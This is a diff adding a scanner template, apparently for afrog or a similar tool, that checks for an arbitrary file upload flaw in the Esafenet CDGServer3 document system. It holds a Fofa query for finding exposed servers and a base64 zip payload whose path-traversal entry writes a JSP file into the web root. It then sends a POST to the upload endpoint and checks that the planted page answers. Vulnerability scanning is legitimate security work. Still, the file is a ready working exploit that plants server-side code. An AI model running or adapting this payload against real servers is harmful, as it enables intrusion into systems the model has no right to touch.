@@ -1,0 +1,41 @@
+id: esafenet-cdgserver3-hiddenwatermark-fileupload
+
+info:
+  name: 亿赛通电子文档管理系统-hiddenWatermark任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    亿赛通电子文档管理系统-hiddenWatermark任意文件上传
+    Fofa: app="亿赛通-电子文档安全管理系统" && cert!="www.esafenet.com" && header="JSESSIONID=" && body="<title>Title</title>"
+  reference:
+    - https://mp.weixin.qq.com/s/BVNDai7H7DPNb5OwNxOgrg
+    - https://mp.weixin.qq.com/s/4wdjNc1VWSFzPLxgL419hg
+  tags: esafenet,fileupload
+  created: 2024/01/31
+set:
+  rboundary: randomLowercase(8)
+  randstr: randomLowercase(6)
+  payload: base64Decode("UEsDBBQAAAAIAAAAIQBIvgxRXQAAAGIAAAAZAAAALi4vLi4vLi4vanMvYXRmZXJzb3RnLmpzcLNRzS8t0Ssoyswr0TA21jIz07TOSy1XyEosS9TLzNdzy8xJ1UgsKMjJTE4syczP00tPLQlKTcwJSCzJ0ChKLSxNLS4BiQWnFpXlpJaAhTU1NfVSUoG8VA1Na1U7AFBLAwQUAAAACAAAACEAxk44h0kAAABnAAAAFgAAAHRoZW1lL3RoZW1lL3RoZW1lMS54bWyzUdTVrVZyy8xJ9UvMTVWyUkpMTFTSAQsEZ1aBBIyMjIACocWpRXAVQL5LakFiUUlual4JTASkwtMFxivJBKs1NDJWqtXVtQMAUEsBAhQAFAAAAAgAAAAhAEi+DFFdAAAAYgAAABkAAAAAAAAAAAAAAIABAAAAAC4uLy4uLy4uL2pzL2F0ZmVyc290Zy5qc3BQSwECFAAUAAAACAAAACEAxk44h0kAAABnAAAAFgAAAAAAAAAAAAAAgAGUAAAAdGhlbWUvdGhlbWUvdGhlbWUxLnhtbFBLBQYAAAAAAgACAIsAAAARAQAAAAA=")
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CDGServer3/hiddenWatermark/uploadFile
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"doc\"; filename=\"ceshi.zip\"\r\n\
+        Content-Type: application/zip\r\n\
+        \r\n\
+        {{payload}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /CDGServer3/js/atfersotg.jsp
+    expression: response.status == 200 && response.body.bcontains(b'2178')
+expression: r0() && r1() # 详细操作请参考：https://mp.weixin.qq.com/s/BVNDai7H7DPNb5OwNxOgrg
